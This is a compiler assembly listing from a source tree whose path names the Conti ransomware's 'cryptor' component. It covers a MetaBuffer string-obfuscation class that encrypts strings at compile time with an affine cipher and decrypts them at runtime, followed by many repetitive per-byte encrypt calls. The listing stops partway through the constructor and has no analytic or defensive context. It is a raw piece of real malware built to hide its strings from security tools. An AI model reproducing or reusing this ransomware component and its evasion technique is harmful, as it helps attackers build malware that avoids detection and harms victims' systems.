?isDecrypted@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv896 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
